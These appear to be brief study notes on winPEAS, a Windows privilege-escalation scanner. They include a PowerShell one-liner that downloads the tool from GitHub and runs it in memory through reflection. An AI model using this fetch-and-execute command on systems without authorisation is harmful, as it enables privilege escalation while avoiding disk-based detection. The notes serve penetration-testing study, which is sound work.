- Github: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe
- WinPeas scans to find Privilege Escalation Paths
	- looks for potential vulnerabilities and weaknesses
	- Knowing how to read output and knowing what's important is the most 'difficult' part
- Main two lines needed to run (refer to github for more): 
```
# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```